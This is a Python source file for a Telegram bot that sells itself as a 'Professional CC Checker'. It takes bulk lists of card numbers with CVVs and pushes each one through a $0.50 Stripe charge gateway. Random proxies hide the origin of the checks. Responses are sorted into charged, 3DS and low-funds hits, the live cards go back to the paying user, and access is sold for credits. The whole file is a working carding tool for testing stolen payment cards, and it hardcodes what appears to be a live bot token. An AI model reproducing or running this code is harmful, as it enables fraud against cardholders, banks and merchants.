import requests
import telebot
import time
import os
import threading
import sqlite3
import random
import json
import re
from telebot import types
from gatet0 import Tele
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

# ==========================================
# ========== CONFIGURATION ==========
# ==========================================
TOKEN = '8868124822:AAEoitsR_ASGYpFOyUpikeQfc0RaXRAWQFI'
ADMIN_ID = '7622959338'
bot = telebot.TeleBot(TOKEN, parse_mode="HTML")
DEVELOPER = "@Avashira"
BOT_NAME = "Anyone"
DB_NAME = "cyber_v_master.db"
DELAY_BETWEEN_CARDS = 2.5   # increased to avoid rate limits

# ==========================================
# ========== PROXY HANDLING ==========
# ==========================================
PROXY_FILE = "proxy.txt"

def load_proxies():
    proxies = []
    if os.path.exists(PROXY_FILE):
        with open(PROXY_FILE, "r") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    if not line.startswith("http"):
                        line = "http://" + line
                    proxies.append(line)
    return proxies

PROXY_LIST = load_proxies()
print(f"[PROXY] Loaded {len(PROXY_LIST)} proxies")

def get_random_proxy():
    if not PROXY_LIST:
        return None
    return random.choice(PROXY_LIST)

def set_proxy(proxy_url):
    if proxy_url:
        os.environ['HTTP_PROXY'] = proxy_url
        os.environ['HTTPS_PROXY'] = proxy_url
    else:
        os.environ.pop('HTTP_PROXY', None)
        os.environ.pop('HTTPS_PROXY', None)

# ==========================================
# ========== REGEX EXTRACTOR ==========
# ==========================================
CARD_REGEX = re.compile(r'(\d{16})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})')

def extract_cards_from_text(text):
    return [match.group(0) for match in CARD_REGEX.finditer(text)]

# ==========================================
# ========== DATABASE ==========
# ==========================================
def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users 
                 (user_id TEXT PRIMARY KEY, credits INTEGER, ban_until INTEGER)''')
    if os.path.exists("users_db.json"):
        try:
            with open("users_db.json", "r") as f:
                old_data = json.load(f)
                for uid, val in old_data.items():
                    credits = val["credits"] if isinstance(val, dict) else val
                    ban_until = val.get("ban_until", 0) if isinstance(val, dict) else 0
                    c.execute("INSERT OR IGNORE INTO users (user_id, credits, ban_until) VALUES (?, ?, ?)", 
                              (str(uid), credits, ban_until))
            print("[DB] Migration from JSON completed.")
        except Exception as e:
            print(f"[DB] Migration Error: {e}")
    c.execute("INSERT OR IGNORE INTO users (user_id, credits, ban_until) VALUES (?, ?, ?)", 
              (ADMIN_ID, 999999, 0))
    conn.commit()
    conn.close()

def get_user_data(user_id):
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("SELECT credits, ban_until FROM users WHERE user_id = ?", (str(user_id),))
    res = c.fetchone()
    if not res:
        c.execute("INSERT INTO users (user_id, credits, ban_until) VALUES (?, ?, ?)", (str(user_id), 0, 0))
        conn.commit()
        res = (0, 0)
    conn.close()
    return {"credits": res[0], "ban_until": res[1]}

def update_credits(user_id, amount):
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("UPDATE users SET credits = credits + ? WHERE user_id = ?", (amount, str(user_id)))
    conn.commit()
    conn.close()

def penalty_user(user_id, rate):
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("UPDATE users SET credits = credits / 2, ban_until = ? WHERE user_id = ?", 
              (int(time.time() + 1800), str(user_id)))
    conn.commit()
    conn.close()
    warning = f"""
⚠️ <b>SYSTEM ALERT: SPAM DETECTED!</b>
━━━━━━━━━━━━━━━━━━━━━━━━
Your session has been terminated. 
<b>CVV Error Rate:</b> {rate:.1f}%

<b>Penalties Applied:</b>
- 50% Credit Deduction
- 30 Minutes Temporary Ban
━━━━━━━━━━━━━━━━━━━━━━━━
<b>Reason:</b> High frequency of generated or incorrect card testing detected.
<b>Dev:</b> {DEVELOPER}
"""
    bot.send_message(user_id, warning)

init_db()

# ==========================================
# ========== UTILITIES ==========
# ==========================================
def is_banned(user_id):
    data = get_user_data(user_id)
    if time.time() < data["ban_until"]:
        remaining = int((data["ban_until"] - time.time()) / 60)
        return True, remaining
    return False, 0

def typewriter_msg(chat_id, text):
    msg = bot.send_message(chat_id, "⌛")
    curr = ""
    for char in text:
        curr += char
        try:
            bot.edit_message_text(chat_id=chat_id, message_id=msg.message_id, text=curr + " ▮")
            time.sleep(0.05)
        except: pass
    bot.edit_message_text(chat_id=chat_id, message_id=msg.message_id, text=curr)

# ==========================================
# ========== IMPROVED BIN LOOKUP ==========
# ==========================================
def get_bin_info(cc):
    # Try binlist.net first
    try:
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
        r = requests.get(f'https://lookup.binlist.net/{cc[:6]}', headers=headers, timeout=8)
        if r.status_code == 200:
            data = r.json()
            bank = data.get('bank', {}).get('name', '𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
            country = data.get('country', {}).get('name', '𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
            emoji = data.get('country', {}).get('emoji', '🏳️')
            scheme = data.get('scheme', '𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
            card_type = data.get('type', '𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
            return bank, country, emoji, scheme, card_type
    except: pass

    # Fallback: try a free alternative (if needed)
    # For now, return unknown
    return "𝒖𝒏𝒌𝒏𝒐𝒘𝒏", "𝒖𝒏𝒌𝒏𝒐𝒘𝒏", "🏳️", "𝒖𝒏𝒌𝒏𝒐𝒘𝒏", "𝒖𝒏𝒌𝒏𝒐𝒘𝒏"

# ==========================================
# ========== CLASSIFICATION ==========
# ==========================================
success_keys = [
    "appreciate", "Payment Success", "redirect_to", "thank", "Thanks", "Thank you", "Thank You",
    "redirectUrl", "succeeded", "confirmation", "Successful!", "Successful",
    "hide_form", "redirect_url", "Merci", "Form entry saved", "Success!",
    "donation", "complete", "Payment successful"
]
ccn_keys = ["security code is incorrect", "INCORRECT_CVV", "card number is incorrect", "invalid"]
declined_keys = ["cannot be processed", "CARD_DECLINED", "Your card was declined.", "generic_decline", "declined"]
cvv_keys = ["transaction_not_allowed", "do_not_honor", "CVC"]
insufficient_keys = ["insufficient funds", "INSUFFICIENT_FUNDS", "Insufficient Funds", "insufficient", "not enough", "low funds"]
expired_keys = ["card has expired"]
otp_keys = ["Verifying", "action_required", "verifying", "call_next_method", "requires_source_action", "requires_action", "3d_secure", "authenticate"]

def extract_all_text(obj):
    texts = []
    if isinstance(obj, dict):
        for v in obj.values():
            texts.extend(extract_all_text(v))
    elif isinstance(obj, list):
        for item in obj:
            texts.extend(extract_all_text(item))
    elif isinstance(obj, str):
        texts.append(obj)
    return texts

def classify_response_text(text):
    if not text:
        return "DEAD"
    text_lower = str(text).lower()
    if any(k in text_lower for k in success_keys):
        return "HIT"
    if any(k in text_lower for k in otp_keys):
        return "3DS"
    if any(k in text_lower for k in ccn_keys):
        return "CCN"
    if any(k in text_lower for k in cvv_keys):
        return "CVV"
    if any(k in text_lower for k in insufficient_keys):
        return "INSUFFICIENT"
    if any(k in text_lower for k in expired_keys):
        return "EXPIRED"
    if any(k in text_lower for k in declined_keys):
        return "DECLINED"
    return "DEAD"

def format_response(status, message, amount, elapsed):
    if status == "HIT":
        return f"Thank you for your donation!|{amount}|{elapsed}"
    elif status in ["CCN", "CVV"]:
        return f"security code is incorrect|{amount}|{elapsed}"
    elif status == "3DS":
        return f"3D Secure authentication required|{amount}|{elapsed}"
    elif status == "INSUFFICIENT":
        return f"insufficient funds|{amount}|{elapsed}"
    elif status == "EXPIRED":
        return f"card has expired|{amount}|{elapsed}"
    elif status == "DECLINED":
        return f"Your card was declined.|{amount}|{elapsed}"
    else:
        clean = str(message).replace("{","").replace("}","").replace("'","")[:80]
        return f"DEAD - {clean}|{amount}|{elapsed}"

# ==========================================
# ========== UI COMPONENTS ==========
# ==========================================
def get_main_menu(user_name, user_id, credits):
    text = f"""
<b>⚡ {BOT_NAME} - Professional CC Checker</b>
━━━━━━━━━━━━━━━━━━━━━━━━
<b>👤 User:</b> <code>{user_name}</code>
<b>🆔 ID:</b> <code>{user_id}</code>
<b>💳 Credits:</b> <code>{credits}</code>
━━━━━━━━━━━━━━━━━━━━━━━━
Send a <b>.txt</b> file <b>or</b> use commands:
/chk [cc|mm|yy|cvc]
/mass [list of cards]
<b>Dev:</b> {DEVELOPER}
"""
    markup = types.InlineKeyboardMarkup()
    markup.row(types.InlineKeyboardButton("👤 User Info", callback_data="user_info"),
               types.InlineKeyboardButton("📜 Rule", callback_data="rule"))
    markup.row(types.InlineKeyboardButton("💎 Plan", callback_data="plan"))
    return text, markup

def get_progress_bar(current, total):
    if total == 0: return '▭' * 10, 0
    filled = int(10 * current // total)
    bar = '▬' * filled + '▭' * (10 - filled)
    perc = int((current / total) * 100)
    return bar, perc

# ==========================================
# ========== BOT COMMAND HANDLERS ==========
# ==========================================
@bot.message_handler(commands=["start"])
def start(message):
    uid = str(message.chat.id)
    banned, mins = is_banned(uid)
    if banned:
        bot.reply_to(message, f"🚫 <b>Access Denied!</b>\nYou are temporarily banned for {mins} more minutes.")
        return
    data = get_user_data(uid)
    if data["credits"] <= 0 and uid != ADMIN_ID:
        typewriter_msg(message.chat.id, f"Bot owner is {DEVELOPER}. You need credits to use this bot.")
        return
    text, markup = get_main_menu(message.from_user.first_name, uid, data["credits"])
    bot.send_message(message.chat.id, text, reply_markup=markup)

@bot.message_handler(commands=["back"])
def back(message):
    uid = str(message.chat.id)
    data = get_user_data(uid)
    text, markup = get_main_menu(message.from_user.first_name, uid, data['credits'])
    bot.send_message(message.chat.id, text, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data in ["user_info", "rule", "plan", "back_to_main"])
def menu_cb(call):
    uid = str(call.message.chat.id)
    data = get_user_data(uid)
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="back_to_main"))
    if call.data == "back_to_main":
        text, markup = get_main_menu(call.from_user.first_name, uid, data['credits'])
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=text, reply_markup=markup)
    elif call.data == "user_info":
        info = f"""
<b>👤 USER INFORMATION</b>
━━━━━━━━━━━━━━━━━━━━━━━━
<b>Name:</b> {call.from_user.first_name}
<b>ID:</b> <code>{uid}</code>
<b>Credits:</b> <code>{data['credits']}</code>
<b>Status:</b> {"Admin" if uid == ADMIN_ID else "Premium User"}
━━━━━━━━━━━━━━━━━━━━━━━━
"""
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=info, reply_markup=markup)
    elif call.data == "rule":
        rules = f"""
<b>📜 BOT RULES</b>
━━━━━━━━━━━━━━━━━━━━━━━━
1. No Gen/Fake cards allowed.
2. High CVV Error rate = Auto-ban.
3. One file at a time.
4. Don't spam the gateway.
━━━━━━━━━━━━━━━━━━━━━━━━
Violation will lead to 50% credit penalty!
"""
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=rules, reply_markup=markup)
    elif call.data == "plan":
        plans = f"""
<b>💎 PREMIUM PLANS</b>
━━━━━━━━━━━━━━━━━━━━━━━━
<b>Basic:</b> 100 Credits - 5$
<b>Pro:</b> 500 Credits - 20$
<b>Unlimited:</b> Contact Admin
━━━━━━━━━━━━━━━━━━━━━━━━
<b>Contact:</b> {DEVELOPER}
"""
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=plans, reply_markup=markup)
    bot.answer_callback_query(call.id)

# ========== ADMIN COMMANDS ==========
@bot.message_handler(commands=["addcredit"])
def add_credit(message):
    if str(message.chat.id) != ADMIN_ID: return
    try:
        args = message.text.split()
        update_credits(args[1], int(args[2]))
        bot.reply_to(message, f"✅ Added {args[2]} credits to {args[1]}")
    except: bot.reply_to(message, "Usage: /addcredit [user_id] [amount]")

@bot.message_handler(commands=["rmcredit"])
def rm_credit(message):
    if str(message.chat.id) != ADMIN_ID: return
    try:
        args = message.text.split()
        conn = sqlite3.connect(DB_NAME)
        c = conn.cursor()
        c.execute("UPDATE users SET credits = 0 WHERE user_id = ?", (args[1],))
        conn.commit()
        conn.close()
        bot.reply_to(message, f"✅ Credits cleared for {args[1]}")
    except: bot.reply_to(message, "Usage: /rmcredit [user_id]")

@bot.message_handler(commands=["stats"])
def stats(message):
    if str(message.chat.id) != ADMIN_ID: return
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM users")
    total = c.fetchone()[0]
    conn.close()
    bot.reply_to(message, f"📊 <b>Bot Statistics</b>\n━━━━━━━━━━━━━━━━━━━━━━━━\n<b>Total Users:</b> {total}\n━━━━━━━━━━━━━━━━━━━━━━━━")

# ==========================================
# ========== CHECKER ENGINE ==========
# ==========================================
user_sessions = {}

def send_live_result(chat_id, cc, status_label, response, amount, elapsed):
    """Send a message ONLY for CHARGED, 3DS, or LOW FUNDS."""
    bank, country, emoji, scheme, card_type = get_bin_info(cc)
    msg = f"""<b>CC ☛</b> <code>{cc}</code>
<b>Status ☛</b> {status_label}
<b>Gate ☛</b> Stripe Charge ${amount}
<b>Response ☛</b> <i>{response}</i>
<b>❖ BIN ☛</b> <code>{cc[:6]}</code> - {country} {emoji}
<b>❖ Details ☛</b> {scheme}-{card_type}
<b>❖ Bank ☛</b> {bank}
<b>⏱️ Taken ☛</b> {elapsed}s
<b>🤖 BY:</b> {DEVELOPER}"""
    bot.send_message(chat_id, msg)

def check_card(cc, session):
    if not session['is_running']: return

    session['processed'] += 1
    start_time = time.time()

    proxy_url = get_random_proxy()
    set_proxy(proxy_url)
    if proxy_url:
        print(f"[PROXY] Using {proxy_url} for {cc}")
    else:
        print("[PROXY] No proxy, direct connection")

    try:
        raw_response = Tele(cc)
        print(f"[{datetime.now().strftime('%H:%M:%S')}] {cc} -> {raw_response[:100]}")
    except Exception as e:
        print(f"[{datetime.now().strftime('%H:%M:%S')}] {cc} -> Error: {e}")
        session['net_err'] += 1
        session['last_response'] = f"Error: {str(e)[:30]}"
        session['last_cc'] = cc
        set_proxy(None)
        return
    finally:
        set_proxy(None)

    elapsed = round(time.time() - start_time, 1)

    # Parse and classify
    try:
        j = json.loads(raw_response)
        all_strings = extract_all_text(j)
        full_text = " ".join(all_strings)
        if any(k in full_text.lower() for k in ["insufficient", "not enough", "low funds"]):
            status = "INSUFFICIENT"
            message = "insufficient funds"
        else:
            status = classify_response_text(full_text)
            if 'errors' in j:
                err = j['errors']
                message = " ".join([str(v) for v in err.values()]) if isinstance(err, dict) else str(err)
            elif 'message' in j:
                message = j['message']
            else:
                message = full_text[:80]
    except (json.JSONDecodeError, ValueError):
        full_text = raw_response
        if "insufficient" in full_text.lower():
            status = "INSUFFICIENT"
            message = "insufficient funds"
        else:
            status = classify_response_text(full_text)
            message = full_text[:80]

    result = format_response(status, message, "0.50", elapsed)
    parts = result.split('|')
    last = parts[0].strip() if parts else "Unknown"
    amt = "0.50"
    rt = parts[-1].strip() if len(parts) >= 3 else str(elapsed)

    session['last_response'] = last
    session['last_cc'] = cc

    last_l = last.lower()

    # Only send messages for CHARGED, 3DS, or LOW FUNDS
    send_msg = False
    if any(x in last_l for x in ["thank", "success", "Thank you", "Thank You", "complete", "succeeded", "donation"]):
        session['charged'] += 1
        session['charged_list'].append(cc)
        status_label = "✅ CHARGED 🔥"
        send_msg = True
    elif any(x in last_l for x in ["3d", "verifying", "action_required", "authenticate", "strong customer authentication"]):
        session['otp'] += 1
        session['otp_list'].append(cc)
        status_label = "🔐 3DS / OTP ✅"
        send_msg = True
    elif any(x in last_l for x in ["insufficient funds", "low funds", "insufficient", "not enough"]):
        session['low'] += 1
        session['low_list'].append(cc)
        status_label = "🥀 LOW FUNDS"
        send_msg = True
    elif "security code" in last_l or "cvv" in last_l:
        session['cvv_err'] += 1
        session['declined'] += 1
        # DO NOT send message
    elif "card number is incorrect" in last_l:
        session['declined'] += 1
        # DO NOT send
    elif "card has expired" in last_l:
        session['declined'] += 1
        # DO NOT send
    elif any(x in last_l for x in ["network_error", "network error", "proxy_error"]):
        session['net_err'] += 1
        # DO NOT send
    else:
        session['declined'] += 1
        # DO NOT send

    if send_msg:
        send_live_result(session['chat_id'], cc, status_label, last, amt, rt)

    # Anti-spam check
    if session['processed'] >= 10:
        cvv_rate = (session['cvv_err'] / session['processed']) * 100
        if cvv_rate > 50 and not session.get('penalized', False):
            session['penalized'] = True
            session['is_running'] = False
            penalty_user(session['user_id'], cvv_rate)

def update_ui_thread(chat_id, msg_id, session):
    while session['is_running']:
        markup = types.InlineKeyboardMarkup()
        markup.row(types.InlineKeyboardButton(f"🔥 Charged: {session['charged']}", callback_data='x'),
                   types.InlineKeyboardButton(f"✅ OTP: {session['otp']}", callback_data='x'))
        markup.row(types.InlineKeyboardButton(f"🥀 Low: {session['low']}", callback_data='x'),
                   types.InlineKeyboardButton(f"❌ Dead: {session['declined']}", callback_data='x'))
        markup.row(types.InlineKeyboardButton(f"🌐 NetErr: {session['net_err']}", callback_data='x'))
        markup.row(types.InlineKeyboardButton(f"🛑 Stop Check", callback_data=f"stop_{chat_id}"))

        elapsed = round(time.time() - session['start'], 1)
        bar, perc = get_progress_bar(session['processed'], session['total'])

        text = f"""<b>Arise</b>

𝘾𝙖𝙧𝙙 ➲ <code>{session['last_cc']}</code>
𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ➲ <code>Stripe Charged</code>
𝘼𝙢𝙤𝙪𝙣𝙩 ➲ <code>{session['total']}</code>
𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➲ <code>{session['last_response']}</code>
<pre>𝙋𝙧𝙤𝙜𝙧𝙚𝙨𝙨 ➲ {bar} {perc}%</pre>
𝙏𝙤𝙩𝙖𝙡 𝙏𝙖𝙠𝙚𝙣 ➲ <code>{elapsed}s</code>"""

        try:
            bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=text, reply_markup=markup)
        except: pass
        time.sleep(5)

def process_card_list(message, card_lines):
    uid = str(message.chat.id)
    user_data = get_user_data(uid)
    if user_data["credits"] <= 0 and uid != ADMIN_ID:
        bot.reply_to(message, "❌ Insufficient Credits. Please buy more.")
        return

    session = {
        'user_id': uid,
        'chat_id': message.chat.id,
        'total': len(card_lines),
        'charged': 0,
        'otp': 0,
        'low': 0,
        'declined': 0,
        'net_err': 0,
        'processed': 0,
        'cvv_err': 0,
        'charged_list': [],
        'otp_list': [],
        'low_list': [],
        'is_running': True,
        'manual_stop': False,
        'start': time.time(),
        'last_cc': 'Wait...',
        'last_response': 'Waiting...'
    }
    user_sessions[uid] = session

    msg = bot.reply_to(message, "🚀 <b>Starting check...</b>")
    msg_id = msg.message_id

    threading.Thread(target=update_ui_thread, args=(message.chat.id, msg_id, session)).start()

    with ThreadPoolExecutor(max_workers=1) as executor:
        for cc in card_lines:
            if not session['is_running']:
                session['manual_stop'] = True
                break
            executor.submit(check_card, cc, session)
            time.sleep(DELAY_BETWEEN_CARDS)  # increased delay

    session['is_running'] = False
    time.sleep(1)

    if not session.get('penalized', False):
        duration = round(time.time() - session['start'], 2)
        status_title = "🛑 Stopped by User" if session['manual_stop'] else "✅ Successfully Completed!"

        final_ui = f"""
<b>{status_title}</b>
📅 <b>Date:</b> {datetime.now().strftime('%d %b %Y, %I:%M %p')}
⏱️ <b>Time Taken:</b> {duration}s

📊 <b>Summary Report</b>
<pre>
Total Cards : {session['total']}
━━━━━━━━━━━━━━━━━━━━
Charged     : {session['charged']}
OTP         : {session['otp']}
Low Funds   : {session['low']}
Declined    : {session['declined']}
Net Errors  : {session['net_err']}
</pre>
🤖 <b>BY:</b> {DEVELOPER}
"""
        bot.edit_message_text(chat_id=message.chat.id, message_id=msg_id, text=final_ui)

        for lst, name in [(session['charged_list'], 'Charged'), (session['otp_list'], '3DS_OTP'), (session['low_list'], 'LowFunds')]:
            if lst:
                res_path = f"{name}_{uid}.txt"
                with open(res_path, "w") as f: f.write("\n".join(lst))
                with open(res_path, "rb") as f: bot.send_document(message.chat.id, f, caption=f"✅ {name} Results")
                os.remove(res_path)

        if uid != ADMIN_ID:
            update_credits(uid, -1)

# ==========================================
# ========== COMMANDS ==========
# ==========================================
@bot.message_handler(commands=["chk"])
def single_check(message):
    uid = str(message.chat.id)
    banned, mins = is_banned(uid)
    if banned:
        bot.reply_to(message, f"🚫 Banned for {mins}m")
        return
    user_data = get_user_data(uid)
    if user_data["credits"] <= 0 and uid != ADMIN_ID:
        bot.reply_to(message, "❌ Insufficient Credits.")
        return

    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        bot.reply_to(message, "❌ Usage: /chk [cc|mm|yy|cvc]")
        return

    raw_card = args[1].strip()
    extracted = extract_cards_from_text(raw_card)
    if not extracted:
        bot.reply_to(message, "❌ No valid card data found.")
        return
    card = extracted[0]

    if uid != ADMIN_ID:
        update_credits(uid, -1)

    processing_msg = bot.reply_to(message, "⏳ Checking card...")

    def do_check():
        start_time = time.time()
        proxy_url = get_random_proxy()
        set_proxy(proxy_url)
        try:
            raw = Tele(card)
            elapsed = round(time.time() - start_time, 1)
            # Classify (same as above)
            try:
                j = json.loads(raw)
                all_text = " ".join(extract_all_text(j))
                if any(k in all_text.lower() for k in ["insufficient", "not enough", "low funds"]):
                    msg_text = "insufficient funds"
                else:
                    if any(k in all_text.lower() for k in success_keys):
                        msg_text = "Thank you for your donation!"
                    elif any(k in all_text.lower() for k in otp_keys):
                        msg_text = "3D Secure authentication required"
                    elif any(k in all_text.lower() for k in cvv_keys) or "security code" in all_text.lower():
                        msg_text = "security code is incorrect"
                    elif any(k in all_text.lower() for k in ccn_keys):
                        msg_text = "Your card number is incorrect"
                    elif any(k in all_text.lower() for k in expired_keys):
                        msg_text = "card has expired"
                    elif any(k in all_text.lower() for k in declined_keys):
                        msg_text = "Your card was declined."
                    else:
                        msg_text = "DEAD - " + all_text[:50]
            except:
                raw_lower = raw.lower()
                if any(k in raw_lower for k in ["insufficient", "not enough"]):
                    msg_text = "insufficient funds"
                elif "thank" in raw_lower or "success" in raw_lower:
                    msg_text = "Thank you for your donation!"
                elif any(k in raw_lower for k in ["3d", "verifying"]):
                    msg_text = "3D Secure authentication required"
                elif "security code" in raw_lower or "cvv" in raw_lower:
                    msg_text = "security code is incorrect"
                elif "declined" in raw_lower:
                    msg_text = "Your card was declined."
                else:
                    msg_text = "DEAD - " + raw[:50]

            bank, country, emoji, scheme, card_type = get_bin_info(card)
            status = "❌ DECLINED"
            if "thank" in msg_text.lower() or "success" in msg_text.lower():
                status = "✅ CHARGED 🔥"
            elif "3d" in msg_text.lower() or "authenticate" in msg_text.lower():
                status = "🔐 3DS / OTP ✅"
            elif "insufficient" in msg_text.lower():
                status = "🥀 LOW FUNDS"
            elif "security code" in msg_text.lower() or "cvv" in msg_text.lower():
                status = "❌ CVV ERROR"
            elif "card number is incorrect" in msg_text.lower():
                status = "❌ CCN"
            elif "card has expired" in msg_text.lower():
                status = "❌ EXPIRED"
            elif "network" in msg_text.lower():
                status = "🌐 NETWORK ERROR"

            formatted = f"""<b>CC ☛</b> <code>{card}</code>
<b>Status ☛</b> {status}
<b>Gate ☛</b> Stripe Charge $0.50
<b>Response ☛</b> <i>{msg_text}</i>
<b>❖ BIN ☛</b> <code>{card[:6]}</code> - {country} {emoji}
<b>❖ Details ☛</b> {scheme}-{card_type}
<b>❖ Bank ☛</b> {bank}
<b>⏱️ Taken ☛</b> {elapsed}s
<b>🤖 BY:</b> {DEVELOPER}"""
            bot.edit_message_text(formatted, chat_id=message.chat.id, message_id=processing_msg.message_id, parse_mode="HTML")
        except Exception as e:
            bot.edit_message_text(f"❌ Error: {e}", chat_id=message.chat.id, message_id=processing_msg.message_id)
        finally:
            set_proxy(None)

    threading.Thread(target=do_check).start()

# ==========================================
# ========== MASS & FILE HANDLERS ==========
# ==========================================
@bot.message_handler(commands=["mass"])
def mass_check(message):
    uid = str(message.chat.id)
    banned, mins = is_banned(uid)
    if banned:
        bot.reply_to(message, f"🚫 Banned for {mins}m")
        return
    user_data = get_user_data(uid)
    if user_data["credits"] <= 0 and uid != ADMIN_ID:
        bot.reply_to(message, "❌ Insufficient Credits.")
        return

    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        bot.reply_to(message, "❌ Usage: /mass [list of cards]")
        return

    valid_cards = extract_cards_from_text(args[1])
    if not valid_cards:
        bot.reply_to(message, "❌ No valid cards found.")
        return

    bot.reply_to(message, f"🚀 Starting batch for {len(valid_cards)} cards.")
    threading.Thread(target=process_card_list, args=(message, valid_cards)).start()

@bot.message_handler(content_types=["document"])
def handle_docs(message):
    uid = str(message.chat.id)
    banned, mins = is_banned(uid)
    if banned:
        bot.reply_to(message, f"🚫 Banned for {mins}m")
        return
    user_data = get_user_data(uid)
    if user_data["credits"] <= 0 and uid != ADMIN_ID:
        bot.reply_to(message, "❌ Insufficient Credits.")
        return

    file_info = bot.get_file(message.document.file_id)
    downloaded = bot.download_file(file_info.file_path)
    content = downloaded.decode()
    valid_cards = extract_cards_from_text(content)
    if not valid_cards:
        bot.reply_to(message, "❌ No valid cards found.")
        return

    threading.Thread(target=process_card_list, args=(message, valid_cards)).start()

# ==========================================
# ========== STOP CALLBACK ==========
# ==========================================
@bot.callback_query_handler(func=lambda call: call.data.startswith('stop_'))
def stop_cb(call):
    uid = call.data.split('_')[1]
    if uid in user_sessions:
        user_sessions[uid]['is_running'] = False
        bot.answer_callback_query(call.id, "🛑 Stopping...")

# ==========================================
# ========== MAIN ==========
# ==========================================
if __name__ == "__main__":
    print(f"[{datetime.now().strftime('%H:%M:%S')}] {BOT_NAME} is starting...")
    bot.remove_webhook()
    bot.polling(none_stop=True)